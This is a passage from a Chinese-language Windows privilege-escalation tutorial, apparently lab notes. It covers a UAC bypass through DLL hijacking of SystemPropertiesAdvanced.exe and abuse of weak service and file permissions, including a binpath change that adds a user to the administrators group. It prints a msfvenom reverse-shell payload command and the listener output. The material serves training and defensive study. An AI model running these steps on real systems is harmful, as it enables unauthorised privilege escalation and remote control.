已禁用（企业默认）</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated">用户帐户控制：仅提升已签名和验证的可执行文件</a></td><td>ValidateAdminCodeSignatures</td><td>已禁用</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations">用户帐户控制：仅提升安装在安全位置的 UIAccess 应用程序</a></td><td>EnableSecureUIAPaths</td><td>已启用</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode">用户帐户控制：以管理员批准模式运行所有管理员</a></td><td>EnableLUA</td><td>已启用</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation">用户帐户控制：提示提升权限时切换到安全桌面</a></td><td>PromptOnSecureDesktop</td><td>已启用</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations">用户帐户控制：将文件和注册表写入失败虚拟化到每个用户位置</a></td><td>EnableVirtualization</td><td>已启用</td></tr></tbody></table><p>没有命令行版本的 GUI 同意提示，因此必须绕过 UAC 才能使用特权访问令牌执行命令。</p><p>查看 UAC 是否已启用，如果已启用，则启用到什么级别。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">REG</span> <span class="title">QUERY</span> <span class="title">HKEY_LOCAL_MACHINE</span>\<span class="title">Software</span>\<span class="title">Microsoft</span>\<span class="title">Windows</span>\<span class="title">CurrentVersion</span>\<span class="title">Policies</span>\<span class="title">System</span>\ /<span class="title">v</span> <span class="title">EnableLUA</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">HKEY_LOCAL_MACHINE</span>\<span class="title">Software</span>\<span class="title">Microsoft</span>\<span class="title">Windows</span>\<span class="title">CurrentVersion</span>\<span class="title">Policies</span>\<span class="title">System</span></span></span><br><span class="line"><span class="function">    <span class="title">EnableLUA</span>    <span class="title">REG_DWORD</span>    0<span class="title">x1</span></span></span><br></pre></td></tr></table></figure><p>检查 UAC 级别</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">REG</span> <span class="title">QUERY</span> <span class="title">HKEY_LOCAL_MACHINE</span>\<span class="title">Software</span>\<span class="title">Microsoft</span>\<span class="title">Windows</span>\<span class="title">CurrentVersion</span>\<span class="title">Policies</span>\<span class="title">System</span>\ /<span class="title">v</span> <span class="title">ConsentPromptBehaviorAdmin</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">HKEY_LOCAL_MACHINE</span>\<span class="title">Software</span>\<span class="title">Microsoft</span>\<span class="title">Windows</span>\<span class="title">CurrentVersion</span>\<span class="title">Policies</span>\<span class="title">System</span></span></span><br><span class="line"><span class="function">    <span class="title">ConsentPromptBehaviorAdmin</span>    <span class="title">REG_DWORD</span>    0<span class="title">x5</span></span></span><br></pre></td></tr></table></figure><p><code>ConsentPromptBehaviorAdmin</code>的值为<code>0x5</code>，表示<code>Always notify</code>启用了最高级别的 UAC 。此最高级别的 UAC 绕过较少。</p><p>UAC 绕过利用了不同 Windows 版本中的缺陷或意外功能。检查一下想要提升的 Windows 版本。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; [<span class="type">environment</span>]::OSVersion.Version</span><br><span class="line"></span><br><span class="line">Major  Minor  Build  Revision</span><br><span class="line"><span class="literal">-----</span>  <span class="literal">-----</span>  <span class="literal">-----</span>  <span class="literal">--------</span></span><br><span class="line"><span class="number">10</span>     <span class="number">0</span>      <span class="number">14393</span>  <span class="number">0</span></span><br></pre></td></tr></table></figure><p>返回内部版本 14393，使用<a href="https://en.wikipedia.org/wiki/Windows_10_version_history">此页面</a>交叉引用 Windows 版本<code>1607</code>。</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1732190459118.png" alt="build"></p><p><a href="https://github.com/hfiref0x/UACME">UACME</a>项目维护着一个 UAC 绕过列表，包括受影响的 Windows 版本号、所用技术以及 Microsoft 是否已发布安全更新来修复它的信息。技术编号 54，据说该技术从 Windows 10 版本 14393 开始工作。此技术针对自动提升二进制文件的 32 位版本<code>SystemPropertiesAdvanced.exe</code>。Windows 将允许许多受信任的二进制文件自动提升权限，而无需 UAC 同意提示。</p><p>当尝试定位 DLL 时，Windows 将使用以下搜索顺序：</p><ol><li>应用程序加载的目录。</li><li><code>C:\Windows\System32</code>64位系统的系统目录。</li><li>16 位系统目录<code>C:\Windows\System</code>（不支持 64 位系统）</li><li>Windows 目录。</li><li>PATH 环境变量中列出的任何目录。</li></ol><p>检查路径变量</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; cmd /c <span class="built_in">echo</span> %PATH%</span><br><span class="line"></span><br><span class="line">C:\Windows\system32;</span><br><span class="line">C:\Windows;</span><br><span class="line">C:\Windows\System32\Wbem;</span><br><span class="line">C:\Windows\System32\WindowsPowerShell\v1.<span class="number">0</span>\;</span><br><span class="line">C:\Users\sarah\AppData\Local\Microsoft\WindowsApps;</span><br></pre></td></tr></table></figure><p>通过 DLL 劫持来绕过 UAC，方法是将恶意<code>srrstr.dll</code> 放置到<code>WindowsApps</code>文件夹中，该 DLL 将在提升的上下文中加载。</p><p>生成一个 DLL 来执行反向 shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll &gt; srrstr.dll</span><br></pre></td></tr></table></figure><p>如果执行恶意<code>srrstr.dll</code>文件，将收到一个显示正常用户权限（已启用 UAC）的 shell。为了测试这一点，可以运行 DLL<code>rundll32.exe</code>来获取反向 shell 连接。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">rundll32</span> <span class="title">shell32.dll</span>,<span class="title">Control_RunDLL</span> <span class="title">C</span>:\<span class="title">Users</span>\<span class="title">sarah</span>\<span class="title">AppData</span>\<span class="title">Local</span>\<span class="title">Microsoft</span>\<span class="title">WindowsApps</span>\<span class="title">srrstr.dll</span></span></span><br></pre></td></tr></table></figure><p>一旦重新建立连接，将看到正常的用户权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ nc -lnvp 8443</span><br><span class="line"></span><br><span class="line">listening on [any] 8443 ...</span><br><span class="line"></span><br><span class="line">connect to [10.10.14.3] from (UNKNOWN) [10.129.43.16] 49789</span><br><span class="line">Microsoft Windows [Version 10.0.14393]</span><br><span class="line">(c) 2016 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Users\sarah&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                          State   </span><br><span class="line">============================= ==================================== ========</span><br><span class="line">SeShutdownPrivilege           Shut down the system                 Disabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking             Enabled </span><br><span class="line">SeUndockPrivilege             Remove computer from docking station Disabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled</span><br><span class="line">SeTimeZonePrivilege           Change the time zone                 Disabled</span><br></pre></td></tr></table></figure><p>再执行 SystemPropertiesAdvanced.exe</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">SysWOW64</span>\<span class="title">SystemPropertiesAdvanced.exe</span></span></span><br></pre></td></tr></table></figure><p>收到了一个提升的shell，表明权限可用，并且可以在需要时启用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">$ nc -lvnp 8443</span><br><span class="line"></span><br><span class="line">listening on [any] 8443 ...</span><br><span class="line">connect to [10.10.14.3] from (UNKNOWN) [10.129.43.16] 50273</span><br><span class="line">Microsoft Windows [Version 10.0.14393]</span><br><span class="line">(c) 2016 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">winlpe-ws03\sarah</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami /priv</span><br><span class="line"></span><br><span class="line">whoami /priv</span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line">Privilege Name                            Description                                                        State</span><br><span class="line">========================================= ================================================================== ========</span><br><span class="line">SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled</span><br><span class="line">SeSecurityPrivilege                       Manage auditing and security log                                   Disabled</span><br><span class="line">SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled</span><br><span class="line">SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled</span><br><span class="line">SeSystemProfilePrivilege                  Profile system performance                                         Disabled</span><br><span class="line">SeSystemtimePrivilege                     Change the system time                                             Disabled</span><br><span class="line">SeProfileSingleProcessPrivilege           Profile single process                                             Disabled</span><br><span class="line">SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled</span><br><span class="line">SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled</span><br><span class="line">SeBackupPrivilege                         Back up files and directories                                      Disabled</span><br><span class="line">SeRestorePrivilege                        Restore files and directories                                      Disabled</span><br><span class="line">SeShutdownPrivilege                       Shut down the system                                               Disabled</span><br><span class="line">SeDebugPrivilege                          Debug programs                                                     Disabled</span><br><span class="line">SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled</span><br><span class="line">SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled</span><br><span class="line">SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled</span><br><span class="line">SeUndockPrivilege                         Remove computer from docking station                               Disabled</span><br><span class="line">SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled</span><br><span class="line">SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled</span><br><span class="line">SeCreateGlobalPrivilege                   Create global objects                                              Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled</span><br><span class="line">SeTimeZonePrivilege                       Change the time zone                                               Disabled</span><br><span class="line">SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled</span><br><span class="line">SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled</span><br></pre></td></tr></table></figure><hr><h1 id="Weak-Permissions"><a href="#Weak-Permissions" class="headerlink" title="Weak Permissions"></a>Weak Permissions</h1><p>Windows 系统上的权限设置非常复杂，很难正确设置。一个地方的轻微修改可能会在其他地方引入漏洞。</p><h2 id="Permissive-File-System-ACLs"><a href="#Permissive-File-System-ACLs" class="headerlink" title="Permissive File System ACLs"></a>Permissive File System ACLs</h2><h3 id="enumeration"><a href="#enumeration" class="headerlink" title="enumeration"></a>enumeration</h3><p>GhostPack 工具套件中的<a href="https://github.com/GhostPack/SharpUp/">SharpUp</a>来检查是否存在弱 ACL 的服务二进制文件。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\SharpUp.exe audit</span><br><span class="line"></span><br><span class="line">=== SharpUp: Running Privilege Escalation Checks ===</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">=== Modifiable Service Binaries ===</span><br><span class="line"></span><br><span class="line">  Name             : SecurityService</span><br><span class="line">  DisplayName      : PC Security Management Service</span><br><span class="line">  Description      : Responsible <span class="keyword">for</span> managing PC security</span><br><span class="line">  State            : Stopped</span><br><span class="line">  StartMode        : Auto</span><br><span class="line">  PathName         : <span class="string">&quot;C:\Program Files (x86)\PCProtect\SecurityService.exe&quot;</span></span><br><span class="line">  </span><br><span class="line">  &lt;SNIP&gt;</span><br><span class="line">  </span><br></pre></td></tr></table></figure><p>使用 <a href="https://ss64.com/nt/icacls.html">icacls</a> 可以验证漏洞并看到<code>EVERYONE</code>和<code>BUILTIN\Users</code>组已被授予该目录的完全权限，因此任何非特权系统用户都可以操作该目录及其内容。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; icacls <span class="string">&quot;C:\Program Files (x86)\PCProtect\SecurityService.exe&quot;</span></span><br><span class="line"></span><br><span class="line">C:\Program Files (x86)\PCProtect\SecurityService.exe BUILTIN\Users:(I)(F)</span><br><span class="line">                                                     Everyone:(I)(F)</span><br><span class="line">                                                     NT AUTHORITY\SYSTEM:(I)(F)</span><br><span class="line">                                                     BUILTIN\Administrators:(I)(F)</span><br><span class="line">                                                     APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)</span><br><span class="line">                                                     APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)</span><br><span class="line"></span><br><span class="line">Successfully processed <span class="number">1</span> files; Failed processing <span class="number">0</span> files</span><br></pre></td></tr></table></figure><h3 id="Replacing-Service-Binary"><a href="#Replacing-Service-Binary" class="headerlink" title="Replacing Service Binary"></a>Replacing Service Binary</h3><p>此服务也可由非特权用户启动，因此可以备份原始二进制文件，并将其替换为生成的恶意二进制文件<code>msfvenom</code>。</p><h2 id="Weak-Service-Permissions"><a href="#Weak-Service-Permissions" class="headerlink" title="Weak Service Permissions"></a>Weak Service Permissions</h2><h3 id="enumeration-1"><a href="#enumeration-1" class="headerlink" title="enumeration"></a>enumeration</h3><p>SharpUp 发现<code>WindscribeService</code>可能配置错误。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">SharpUp.exe</span> <span class="title">audit</span></span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function">=== <span class="title">SharpUp</span>: <span class="title">Running</span> <span class="title">Privilege</span> <span class="title">Escalation</span> <span class="title">Checks</span> ===</span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function">=== <span class="title">Modifiable</span> <span class="title">Services</span> ===</span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function">  <span class="title">Name</span>             : <span class="title">WindscribeService</span></span></span><br><span class="line"><span class="function">  <span class="title">DisplayName</span>      : <span class="title">WindscribeService</span></span></span><br><span class="line"><span class="function">  <span class="title">Description</span>      : <span class="title">Manages</span> <span class="title">the</span> <span class="title">firewall</span> <span class="title">and</span> <span class="title">controls</span> <span class="title">the</span> <span class="title">VPN</span> <span class="title">tunnel</span></span></span><br><span class="line"><span class="function">  <span class="title">State</span>            : <span class="title">Running</span></span></span><br><span class="line"><span class="function">  <span class="title">StartMode</span>        : <span class="title">Auto</span></span></span><br><span class="line"><span class="function">  <span class="title">PathName</span>         : &quot;<span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span> (<span class="title">x86</span>)\<span class="title">Windscribe</span>\<span class="title">WindscribeService.exe</span>&quot;</span></span><br></pre></td></tr></table></figure><p>Sysinternals 套件中的<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">AccessChk</a>枚举服务的权限。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">accesschk.exe</span> /<span class="title">accepteula</span> -<span class="title">quvcw</span> <span class="title">WindscribeService</span></span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function"><span class="title">Accesschk</span> <span class="title">v6</span>.13 - <span class="title">Reports</span> <span class="title">effective</span> <span class="title">permissions</span> <span class="title">for</span> <span class="title">securable</span> <span class="title">objects</span></span></span><br><span class="line"><span class="function"><span class="title">Copyright</span> ⌐ 2006-2020 <span class="title">Mark</span> <span class="title">Russinovich</span></span></span><br><span class="line"><span class="function"><span class="title">Sysinternals</span> - <span class="title">www.sysinternals.com</span></span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function"><span class="title">WindscribeService</span></span></span><br><span class="line"><span class="function">  <span class="title">Medium</span> <span class="title">Mandatory</span> <span class="title">Level</span> (<span class="title">Default</span>) [<span class="title">No</span>-<span class="title">Write</span>-<span class="title">Up</span>]</span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">SYSTEM</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_ALL_ACCESS</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">BUILTIN</span>\<span class="title">Administrators</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_ALL_ACCESS</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">Authenticated</span> <span class="title">Users</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_ALL_ACCESS</span></span></span><br></pre></td></tr></table></figure><h3 id="更改服务文件路径"><a href="#更改服务文件路径" class="headerlink" title="更改服务文件路径"></a>更改服务文件路径</h3><p>更改它以将用户添加到本地管理员组。可以设置二进制路径来运行选择的任何命令或可执行文件（例如反向 shell 二进制文件）。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">sc</span> <span class="title">config</span> <span class="title">WindscribeService</span> <span class="title">binpath</span>=&quot;<span class="title">cmd</span> /<span class="title">c</span> <span class="title">net</span> <span class="title">localgroup</span> <span class="title">administrators</span> <span class="title">htb</span>-<span class="title">student</span> /<span class="title">add</span>&quot;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[<span class="title">SC</span>] <span class="title">ChangeServiceConfig</span> <span class="title">SUCCESS</span></span></span><br></pre></td></tr></table></figure><p>重启服务，由于完全控制了该服务，因此可以启动它，并且即使返回错误消息，放置在<code>binpath</code>中的命令也会运行。服务无法启动，因为<code>binpath</code>未指向实际的服务可执行文件。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">sc</span> <span class="title">stop</span> <span class="title">WindscribeService</span></span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function"><span class="title">SERVICE_NAME</span>: <span class="title">WindscribeService</span></span></span><br><span class="line"><span class="function">        <span class="title">TYPE</span>               : 10  <span class="title">WIN32_OWN_PROCESS</span></span></span><br><span class="line"><span class="function">        <span class="title">STATE</span>              : 3  <span class="title">STOP_PENDING</span></span></span><br><span class="line"><span class="function">                                (<span class="title">NOT_STOPPABLE</span>, <span class="title">NOT_PAUSABLE</span>, <span class="title">IGNORES_SHUTDOWN</span>)</span></span><br><span class="line"><span class="function">        <span class="title">WIN32_EXIT_CODE</span>    : 0  (0<span class="title">x0</span>)</span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_EXIT_CODE</span>  : 0  (0<span class="title">x0</span>)</span></span><br><span class="line"><span class="function">        <span class="title">CHECKPOINT</span>         : 0<span class="title">x4</span></span></span><br><span class="line"><span class="function">        <span class="title">WAIT_HINT</span>          : 0<span class="title">x0</span></span></span><br><span class="line"><span class="function">        </span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">sc</span> <span class="title">start</span> <span class="title">WindscribeService</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[<span class="title">SC</span>] <span class="title">StartService</span> <span class="title">FAILED</span> 1053:</span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">service</span> <span class="title">did</span> <span class="title">not</span> <span class="title">respond</span> <span class="title">to</span> <span class="title">the</span> <span class="title">start</span> <span class="title">or</span> <span class="title">control</span> <span class="title">request</span> <span class="title">in</span> <span class="title">a</span> <span class="title">timely</span> <span class="title">fashion</span>.</span></span><br></pre></td></tr></table></figure><p>确认本地管理员组添加</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">net</span> <span class="title">localgroup</span> <span class="title">administrators</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Alias</span> <span class="title">name</span>     <span class="title">administrators</span></span></span><br><span class="line"><span class="function"><span class="title">Comment</span>        <span class="title">Administrators</span> <span class="title">have</span> <span class="title">complete</span> <span class="title">and</span> <span class="title">unrestricted</span> <span class="title">access</span> <span class="title">to</span> <span class="title">the</span> <span class="title">computer</span>/<span class="title">domain</span></span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function"><span class="title">Members</span></span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function">-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="title">Administrator</span></span></span><br><span class="line"><span class="function"><span class="title">htb</span>-<span class="title">student</span></span></span><br><span class="line"><span class="function"><span class="title">mrb3n</span></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">command</span> <span class="title">completed</span> <span class="title">successfully</span>.</span></span><br></pre></td></tr></table></figure><h3 id="Clean-2"><a href="#Clean-2" class="headerlink" title="Clean"></a>Clean</h3><p>可以通过停止服务并将二进制路径重置回原始服务可执行文件来自行清理并确保服务正常运行。</p><p>恢复二进制路径</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">sc</span> <span class="title">config</span> <span class="title">WindScribeService</span> <span class="title">binpath</span>=&quot;<span class="title">c</span>:\<span class="title">Program</span> <span class="title">Files</span> (<span class="title">x86</span>)\<span class="title">Windscribe</span>\<span class="title">WindscribeService.exe</span>&quot;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[<span class="title">SC</span>] <span class="title">ChangeServiceConfig</span> <span class="title">SUCCESS</span></span></span><br></pre></td></tr></table></figure><p>重启服务</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">sc</span> <span class="title">start</span> <span class="title">WindScribeService</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">sc</span> <span class="title">query</span> <span class="title">WindScribeService</span></span></span><br></pre></td></tr></table></figure><h2 id="Unquoted-Service-Path"><a href="#Unquoted-Service-Path" class="headerlink" title="Unquoted Service Path"></a>Unquoted Service Path</h2><p>安装服务时，注册表配置会指定服务启动时应执行的二进制文件的路径。如果此二进制文件未用引号括起来，Windows 将尝试在不同的文件夹中查找该二进制文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe</span><br></pre></td></tr></table></figure><p>Windows 将在服务启动时尝试按顺序加载以下潜在可执行文件，其中隐含 .exe：</p><ul><li><code>C:\Program</code></li><li><code>C:\Program Files</code></li><li><code>C:\Program Files (x86)\System</code></li><li><code>C:\Program Files (x86)\System Explorer\service\SystemExplorerService64</code></li></ul><p>查询服务</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">sc</span> <span class="title">qc</span> <span class="title">SystemExplorerHelpService</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[<span class="title">SC</span>] <span class="title">QueryServiceConfig</span> <span class="title">SUCCESS</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">SERVICE_NAME</span>: <span class="title">SystemExplorerHelpService</span></span></span><br><span class="line"><span class="function">        <span class="title">TYPE</span>               : 20  <span class="title">WIN32_SHARE_PROCESS</span></span></span><br><span class="line"><span class="function">        <span class="title">START_TYPE</span>         : 2   <span class="title">AUTO_START</span></span></span><br><span class="line"><span class="function">        <span class="title">ERROR_CONTROL</span>      : 0   <span class="title">IGNORE</span></span></span><br><span class="line"><span class="function">        <span class="title">BINARY_PATH_NAME</span>   : <span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span> (<span class="title">x86</span>)\<span class="title">System</span> <span class="title">Explorer</span>\<span class="title">service</span>\<span class="title">SystemExplorerService64.exe</span></span></span><br><span class="line"><span class="function">        <span class="title">LOAD_ORDER_GROUP</span>   :</span></span><br><span class="line"><span class="function">        <span class="title">TAG</span>                : 0</span></span><br><span class="line"><span class="function">        <span class="title">DISPLAY_NAME</span>       : <span class="title">System</span> <span class="title">Explorer</span> <span class="title">Service</span></span></span><br><span class="line"><span class="function">        <span class="title">DEPENDENCIES</span>       :</span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_START_NAME</span> : <span 